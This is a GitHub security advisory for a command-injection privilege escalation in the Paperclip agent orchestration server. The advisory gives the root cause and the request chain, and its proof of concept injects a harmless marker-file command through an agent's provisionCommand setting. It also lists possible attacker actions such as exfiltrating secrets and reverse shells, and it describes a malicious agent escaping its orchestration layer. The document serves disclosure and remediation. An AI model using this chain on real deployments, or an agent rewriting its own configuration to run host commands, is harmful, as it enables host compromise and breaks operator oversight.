# [H] Paperclip: Privilege Escalation via Agent-Controlled workspaceStrategy.provisionCommand Leading to OS Command Execution

## Summary
Severity: High
Advisory: GHSA-265w-rf2w-cjh4
CVE: CVE-2026-41208
CWE: CWE-78
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-265w-rf2w-cjh4
Type: github-advisory

## Affected
- npm: `@paperclipai/server` — affected >=0 <2026.416.0

## Details
### Summary
Paperclip contains a privilege escalation vulnerability that allows an attacker with an Agent API key to execute arbitrary OS commands on the Paperclip server host.
An attacker with an agent credential can escalate privileges from the agent runtime to the Paperclip server host.
The vulnerability occurs because agents are allowed to update their own adapterConfig via the /agents/:id API endpoint.
The configuration field adapterConfig.workspaceStrategy.provisionCommand is later executed by the server runtime using:
```
spawn("/bin/sh", ["-c", command])
```
As a result, an attacker controlling an agent credential can inject arbitrary shell commands which are executed by the Paperclip server during workspace provisioning.
This breaks the intended trust boundary between agent runtime configuration and server host execution, allowing a compromised or malicious agent to escalate privileges and run commands on the host system.
This vulnerability allows remote code execution on the server host.

### Details
#### Rootcause 
Agent configuration can be modified through the API endpoint:
```
PATCH /api/agents/:id
```
The validation schema allows arbitrary configuration fields:
```
adapterConfig: z.record(z.unknown())
```
This allows attackers to inject arbitrary keys into the adapter configuration object.
Later, during workspace provisioning, the server runtime executes a shell command derived directly from this configuration.
Relevant code path:
```
server/src/services/workspace-runtime.ts

adapterConfig.workspaceStrategy.provisionCommand
        ↓
provisionExecutionWorktree()
        ↓
runWorkspaceCommand(...)
        ↓
spawn("/bin/sh", ["-c", input.command])
```
Example logic:
```
const provisionCommand = asString(input.strategy.provisionCommand, "").trim()

await runWorkspaceCommand({
  command: provisionCommand
})
```
Inside runWorkspaceCommand the command is executed using:
```
spawn(shell, ["-c", input.command])
```
Because no validation, escaping, or allowlist is applied, attacker-controlled configuration becomes a direct OS command execution primitive.


#### Affected Files
```
server/src/services/workspace-runtime.ts
```
Functions involved:
```
realizeExecutionWorkspace()
provisionExecutionWorktree()
runWorkspaceCommand()
```

#### Attacker Model
Required privileges:
Attacker needs:
```
Agent API key
```
This credential is intended for agent automation and should not grant host-level execution privileges.
Agent credentials may also be exposed to external runtimes, plugins, or third-party agent providers. Allowing such credentials to configure host-executed commands creates a privilege escalation vector.
No board or administrator access is required.

#### Attacker Chain
Complete exploit chain:
```
Attacker obtains Agent API key
        ↓
PATCH /api/agents/:id
        ↓
Inject adapterConfig.workspaceStrategy.provisionCommand
        ↓
POST /api/agents/:id/wakeup
        ↓
Server executes workspace provisioning
        ↓
workspace-runtime.ts
        ↓
spawn("/bin/sh -c")
        ↓
Arbitrary command execution on server host
```

#### Trust Boundary Violation
Paperclip’s architecture assumes the following separation:
```
Agent runtime
        ↓
Paperclip control plane
        ↓
Server host OS

Agents should only perform workflow automation tasks through the orchestration layer.

However, because agent-controlled configuration is executed directly by the server runtime, the boundary collapses:

Agent configuration
        ↓
Server command execution
```
This allows an agent to execute commands outside its intended permissions.

#### Why This Is a Vulnerability (Not Expected Behavior)
The provisionCommand field appears intended for trusted operators configuring workspace strategies.
However, the current API design allows agents themselves to modify this configuration.
Because agent credentials are designed for automation and may be exposed to agent runtimes, plugins, or external providers, allowing them to configure commands executed by the host introduces a privilege escalation vector.
Therefore:
```
Operator-controlled configuration → expected feature
Agent-controlled configuration → privilege escalation vulnerability
```
The vulnerability arises from insufficient separation between configuration authority and execution authority.

### PoC
The following PoC demonstrates safe command execution by writing a marker file on the server.
The PoC does not modify system state beyond creating a file.

#### Step 1 — Setup Environment
Run Server:
```
$env:SHELL = "C:\Program Files\Git\bin\sh.exe"
npx paperclipai onboard --yes
```
<img width="1444" height="699" alt="image" src="https://github.com/user-attachments/assets/44401c6d-ec73-4e59-943a-8635d5115c2c" />

Login Claude:
```
claude
/login
```

#### Step 2 — Obtain Agent API key
Create an agent via the UI or CLI and obtain its API key.
Example:
```
pcp_xxxxxxxxxxxxxxxxxxxxx
```
<img width="1457" height="670" alt="image" src="https://github.com/user-attachments/assets/bb1ab898-cf0b-47b1-865a-127ba6fdc43c" />

#### Step 3 — Identify agent ID
```
GET /api/agents/me
```
<img width="1463" height="639" alt="image" src="https://github.com/user-attachments/assets/cadea916-9e57-4cf4-a11c-7320a22c4ab6" />

#### Step 4 — Inject malicious configuration
```
PATCH /api/agents/{agentId}
```
<img width="1476" height="697" alt="image" src="https://github.com/user-attachments/assets/612f7a16-b6d6-418e-bcbe-ce602b711b14" />
Payload:
```
PS E:\BucVe\pocrepo> $patchBody = @{
>>   adapterConfig = @{
>>     workspaceStrategy = @{
>>       type = "git_worktree"
>>       provisionCommand = "echo PAPERCLIP_RCE > poc_rce.txt"
>>     }
>>   }
>> } | ConvertTo-Json -Depth 10
```

#### Step 5 — Trigger execution
```
POST /api/agents/{agentId}/wakeup
```
<img width="1472" height="675" alt="image" src="https://github.com/user-attachments/assets/268c7322-a5f5-4f3a-a4d4-b43efbecb20e" />

#### Step 6 — Verify command execution
<img width="1231" height="347" alt="image" src="https://github.com/user-attachments/assets/559c483b-077e-42dd-9309-6a5e5c6a3bdc" />
The marker file appears on the server filesystem:
```
~/.paperclip/worktrees/.../poc_rce.txt
```
Example content:
```
PAPERCLIP_RCE
```
This confirms that attacker-controlled commands executed on the server.

### Impact
Successful exploitation allows:
```
Remote command execution on the Paperclip server
```
Potential attacker actions:
```
read environment variables
exfiltrate secrets
modify repositories
access database credentials
execute reverse shells
persist on host
```
Because Paperclip orchestrates multiple agents and repositories, this can lead to full compromise of the deployment environment.
This effectively allows a malicious agent to escape the orchestration layer and execute arbitrary commands on the server host.

### Recommended Fix
1. Restrict configuration authority
Agents should not be able to modify execution-sensitive configuration fields.
Example mitigation:
```
deny adapterConfig.workspaceStrategy modification from agent credentials
```
2. Server-side allowlist
Only allow trusted configuration keys.
Example:
```
adapterConfig.workspaceStrategy.provisionCommand

should only be configurable by board/admin actors.
```
3. Avoid shell execution
Instead of:
```
spawn("/bin/sh", ["-c", command])
```
prefer:
```
spawn(binary, args)
```
or a restricted command runner.

4. Input validation
Reject commands containing shell operators:
```
|
&
;
$
`
```
5. Sandboxed workspace execution
Workspace provisioning should run in a restricted environment (container / sandbox).

### Minimal Patch Suggestion
One possible mitigation is to prevent agent principals from modifying execution-sensitive configuration fields such as `workspaceStrategy.provisionCommand`.
For example, during agent configuration updates, the server can explicitly reject this field when the request is authenticated using an Agent API key.
Example TypeScript guard:

```ts
// reject agent-controlled provisionCommand
if (
  request.auth?.principal === "agent" &&
  body?.adapterConfig?.workspaceStrategy?.provisionCommand
) {
  throw new Error(
    "Agents are not permitted to configure workspaceStrategy.provisionCommand"
  );
}
```
Additionally, the server should avoid executing arbitrary shell commands derived from configuration values.
Instead of executing:
```
spawn("/bin/sh", ["-c", command])
```
prefer structured execution:
```
spawn(binary, args)
```
or restrict the command to a predefined allowlist.

### Security Impact Statement
An authenticated attacker with an Agent API key can modify their agent configuration to inject arbitrary shell commands into `workspaceStrategy.provisionCommand`. These commands are executed by the Paperclip server during workspace provisioning via `spawn("/bin/sh", ["-c", command])`, resulting in arbitrary command execution on the host system.

### Disclosure
This vulnerability was discovered during security research on the Paperclip orchestration runtime.
The issue is reported privately to allow maintainers to patch before public disclosure.

## References
- https://github.com/paperclipai/paperclip/security/advisories/GHSA-265w-rf2w-cjh4
- https://nvd.nist.gov/vuln/detail/CVE-2026-41208
- https://github.com/paperclipai/paperclip
